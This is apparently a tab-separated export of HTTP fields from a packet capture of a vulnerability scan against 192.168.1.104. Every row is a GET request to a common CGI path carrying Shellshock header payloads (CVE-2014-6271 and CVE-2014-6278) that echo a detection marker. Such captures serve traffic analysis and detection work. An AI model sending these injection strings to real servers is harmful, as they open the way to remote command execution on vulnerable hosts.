http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									2553					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test
																	Keep-Alive										192.168.1.104									2555					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test-cgi
																	Keep-Alive										192.168.1.104									2557					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test.cgi
																	Keep-Alive										192.168.1.104									2559					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test_cgi.php
																	Keep-Alive										192.168.1.104									2560					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test.cgi.php
																	Keep-Alive										192.168.1.104									2561					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test_cgi.pl
																	Keep-Alive										192.168.1.104									2562					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test-cgi.pl
																	Keep-Alive										192.168.1.104									2564					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test.py
																	Keep-Alive										192.168.1.104									2566					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/test.sh
																	Keep-Alive										192.168.1.104									2568					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									2569					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/uname.cgi
																	Keep-Alive										192.168.1.104									2570					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/viewcvs.cgi
																	Keep-Alive										192.168.1.104									2572					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/welcome
																	Keep-Alive										192.168.1.104									2573					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/whois.cgi
																	Keep-Alive										192.168.1.104									2575					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin-sdb/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin-sdb/
																	Keep-Alive										192.168.1.104									2576					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/
																	Keep-Alive										192.168.1.104									2577					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/admin.cgi
																	Keep-Alive										192.168.1.104									2578					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/administrator.cgi
																	Keep-Alive										192.168.1.104									2580					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/authLogin.cgi
																	Keep-Alive										192.168.1.104									2581					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/bb-hist.sh
																	Keep-Alive										192.168.1.104									2583					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/banner.cgi
																	Keep-Alive										192.168.1.104									2584					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/book.cgi
																	Keep-Alive										192.168.1.104									2585					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/cgiinfo.cgi
																	Keep-Alive										192.168.1.104									2587					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/cgitest.py
																	Keep-Alive										192.168.1.104									2588					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/cgi_wrapper
																	Keep-Alive										192.168.1.104									2590					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/contact.cgi
																	Keep-Alive										192.168.1.104									2592					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/count.cgi
																	Keep-Alive										192.168.1.104									2594					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/defaultwebpage.cgi
																	Keep-Alive										192.168.1.104									2596					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/download.cgi
																	Keep-Alive										192.168.1.104									2598					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/entropysearch.cgi
																	Keep-Alive										192.168.1.104									2600					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/env.cgi
																	Keep-Alive										192.168.1.104									2602					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/environment.cgi
																	Keep-Alive										192.168.1.104									2604					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/ezmlm-browse
																	Keep-Alive										192.168.1.104									2606					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/formmail.cgi
																	Keep-Alive										192.168.1.104									2608					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/FormMail-clone.cgi
																	Keep-Alive										192.168.1.104														() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/guestbook.cgi
																	Keep-Alive										192.168.1.104									2616					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/helpdesk.cgi
																	Keep-Alive										192.168.1.104									2618					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/index.cgi
																	Keep-Alive										192.168.1.104									2619					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/index.php
																	Keep-Alive										192.168.1.104									2620					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/index.pl
																	Keep-Alive										192.168.1.104									2621					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/info.cgi
																	Keep-Alive										192.168.1.104									2622					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/info.sh
																	Keep-Alive										192.168.1.104									2623					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/loadpage.cgi
																	Keep-Alive										192.168.1.104									2625					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/login.cgi
																	Keep-Alive										192.168.1.104									2627					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/login.php
																	Keep-Alive										192.168.1.104									2628					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/login.pl
																	Keep-Alive										192.168.1.104									2629					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/pathtest.pl
																	Keep-Alive										192.168.1.104									2630					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php
																	Keep-Alive										192.168.1.104									2632					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php4
																	Keep-Alive										192.168.1.104									2634					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php5
																	Keep-Alive										192.168.1.104									2635					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php-cgi
																	Keep-Alive										192.168.1.104									2636					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php.cgi
																	Keep-Alive										192.168.1.104									2637					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/php.fcgi
																	Keep-Alive										192.168.1.104									2639					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/printenv
																	Keep-Alive										192.168.1.104									2641					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/restore_config.cgi
																	Keep-Alive										192.168.1.104									2643					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/ruby.rb
																	Keep-Alive										192.168.1.104									2645					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/search
																	Keep-Alive										192.168.1.104									2647					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/search.cgi
																	Keep-Alive										192.168.1.104									2649					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/server.php
																	Keep-Alive										192.168.1.104									2651					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/status
																	Keep-Alive										192.168.1.104									2653					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/sysinfo.pl
																	Keep-Alive										192.168.1.104									2655					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/test
																	Keep-Alive										192.168.1.104									2657					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/test-cgi
																	Keep-Alive										192.168.1.104									2659					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/test.cgi
																	Keep-Alive										192.168.1.104									2661					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/test_cgi.php
																	Keep-Alive										192.168.1.104									2663					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-mod/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-mod/test.cgi.php
